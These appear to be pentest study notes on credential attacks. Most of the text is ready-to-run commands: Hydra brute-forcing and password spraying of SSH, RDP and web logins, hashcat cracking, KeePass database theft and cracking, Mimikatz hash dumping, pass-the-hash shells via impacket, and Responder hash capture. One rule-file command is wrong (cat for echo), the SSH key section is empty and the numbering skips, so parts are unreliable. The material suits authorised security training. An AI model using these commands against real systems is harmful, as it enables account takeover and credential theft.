# Attacking Network Services Logins

## SSH and RDP
Hydra
```bash
hydra -l <USERNAME> -P <PASSWORDLIST_PATH> -s <PORT> ssh://<TARGETIP>
```
We can find usernames by enumeration/information gathering techniques and by using built-in accounts such as root or Administrator

Password spraying: single password, many usernames

Once you have a password, TRY USING IT EVERYWHERE!!!

Hydra can help with this:
```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "<PASSWORD>" rdp://<TARGET_IP>
```

This can lead to accounts being locked out so do not blindly launch these tools.

## HTTP POST Login Form
Check the documentation of a web application to find default users. Then perform bruteforce on those users.

We need 2 pieces of info:
1. POST data itself
2. Failed login attempt (to differentiate between failure and success) -- condition string

Burp!

Now, we can use Hydra:
```bash
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "<LOGINFORM_LOCATION>:<LOGIN_POST_DATA>:<CONDITION_STRING>"
```
Within the <LOGIN_POST_DATA> you need to specify the string to replace as `^PASS^`

For HTTP basic authentication (even if it is encoded in Burp), you can brute force using a user/password list
```bash
hydra -l admin -P rockyou.txt 192.168.191.201 http-get /
```

# Password Cracking Fundamentals
Cracking time = keyspace/hash rate
Keyspace = character set ^ amount of characters of password

To determine the hash for a string:
```bash
echo -n "<STRING>" | sha256sum
```
Example:
```bash
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
python3 -c "print(62**5)"
```
This gives you the keyspace for a 5 character password with a character set of 62

We can determine the hashrate using hashcat's benchmark mode
```bash
hashcat -b
```

Now we should have our hash rate! To calculate our cracking time, we can do keyspace/hash rate
```bash
python3 -c "print(<KEYSPACE_OUTPUT> / <HASHRATE>)"
```

This will give you the amount of seconds it will take to calculate all hashes in that keyspace, and therefore the time it will take to crack the password.

## Mutating Wordlists
Especially for password policies. Make a list of requirements and make sure all passwords in your list satsify these requirements by mutating the wordlist.

You can edit a wordlist using `sed`.

For example: remove all number sequencse (deletes all lines starting with 1 and doing editing in place with `-i`.
```bash
sed -i '/^1/d' demo.txt
```

To mutate a password list, you can make a rule file. It could ook something like this:
```bash
echo \$1 > demo.rule
```
This will append a "1" to all passwords in the list. you can mutate the list with hashcat:

```bash
hashcat -r demo.rule --stdout demo.txt
```
If you make a rule file, each line will be interpreted as a new rule. Adding e.g. 2 rules to your rule file will result in 2 mutated passwords for every password in the wordlist.

The functions in the rule file are interpreted left to right.
```bash
cat \$1 c $! > demo.rule
```
This will add a "1" and a "!", as well as capitalising the word. You don't need to add \ or $ in the rule file for every rule, just look on hashcat wiki for what you want to do exactly. https://hashcat.net/wiki/doku.php?id=rule_based_attack

If we have a hash, we can put this in a file, create a rule file and run hashcat like so:
```bash
hashcat -m 0 <HASHFILE> /usr/share/wordlists/rockyou.txt -r demo3.rule --force
```

Instead of making your own rules, you can use others/use hashcat's built-in rules:
```bash
ls -la /usr/share/hashcat/rules/
```

To use sed to add a string to the end of each entry in a wordlist, you can use this:
```bash
sed 's/.*/&<ADDED_STRING>/' <input_file.txt>
```

## Cracking Methodology

Process:
1. Extract hashes
2. Format hashes
   - Use `hash-identifier` or `hashid` to identify the hash type and change the representation of the hash to the expected format of the cracking tool (where necessary)
4. Calculate the cracking time
   - Do this before you start cracking to know whether it is feasible to attempt to crack the hash (e.g. duration of current pentest)
6. Prepare wordlist
   - Mutate wordlist for password policies and do research on other password vectors (password leaks)
8. Attack the hash
   - Start cracking!
  
## Password manager

Often, we can get access to a workstation and extract the password manager database from it. Then we can transform it to use with hashcat and crack the master database password.

To find the database on Windows:
```PowerShell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Linux:
```bash
find / -type f -name '*.kdbx' 2>/dev/null
```

Transfer this to your Kali machine. If regular copy paste does not work, this might. It will create a network share on the target called "media", which maps to your desktop.:
```bash
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> /drive:media,/home/kali//Desktop
```

To transform this for hashcat:
```bash
keepass2john Database.kdbx > keepass.hash
```
It may be necessary to modify the file further to include/exclude the username. 

Now, determine the hash type in order to determine what mode to run hashcat in
```bash
hashcat --help | grep -i "KeePass"
```

In one command, we can use hashcat to crack the hash in the correct mode and modify the wordlist
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

Now that we have the master password, we can open the password manager, enter the master password and we have access to all the user's passwords.


## SSH Private Key Passphrase


# Working with Password Hashes

## Cracking NTLM
We can get NTLM hashes using Mimikatz. They are stored in the SAM database (lsadump::sam) and/or in the cache of the LSASS process memory (sekurlsa::logonpasswords). Since this is sensitive information, Mimikatz needs to run as Administrator/higher and have the SeDebugPrivilege (privilege::debug/token::elevate)

Once we have the hash, we can crack it using hashcat (mode 1000) /JtR

```bash
hashcat --help | grep -i "ntlm"
```

Now crack it using a wordlist and a rule file
```bash
hashcat -m 1000 hashfile.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Now we have a plaintext ppassword, we can try connecting with RDP/other services

## Passing NTLM
If we cannot crack the hash, we still may be able to pass it.

NTLM/LM password hashes are not salted and static between sessions. We can use this hash for any target with the same username/password.

A few pass the hash tools:

SMB enumeration/management:
- smbclient2 or CrackMapExec

Command execution
-  Scripts from the impacket4 library like psexec.py and wmiexec.py.

Other services:
-  We can also use NTLM hashes to not only connect to target systems with SMB, but also via other protocols like RDP and WinRM
-  Mimikatz

To connect to SMB share:
```bash
smbclient \\\\<TARGET_IP>\\<SHARE_NAME> -U Administrator --pw-nt-hash <PASSWORD_HASH>
```

To obtain shell (always as SYSTEM):

For the hash, use LMHash:NTHash. If we do not use an LM hash, we put 32 0's. 
```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@<TARGET_IP>
```

Can also use wmiexec.py:
```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@<TARGET_IP>
```


## Cracking Net-NTLMv2
NTLMv2 authentication: We send the SMB server a request, the server will send us a challenge in which we encrypt data with our hash. The server will then deny or grant access.

We can set up an SMB server using Responder to capture hashes. 

If we have code execution already:
```PowerShell
ls \\<RESPONDER_IP>\<SHARE>
```

If we do not have code execution, we can try other things:
- File upload: try uploading a file with your SMB share as the file path, e.g. `\\192.168.119.2\share\nonexistent.txt`

If we have code execution without the privileges to run e.g. Mimikatz, we can use Responder to ge the user's hash and crack it.

1. find the interface you want Responder to listen on: `ip a`
2. Set up your responder in listening mode: `sudo responder -I <INTERFACE>`
3. On the compromised device, try accessing a non-existent SMB share on the Responder IP: `dir \\<RESPONDER_IP>\<TEST>`
4. Responder should show the user's password hash and we can crack it: `hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force`
5. Now we can try connecting to any system with this user's credentials, create a password list for this user to try a more informed bruteforce, and gain information about the password policy.
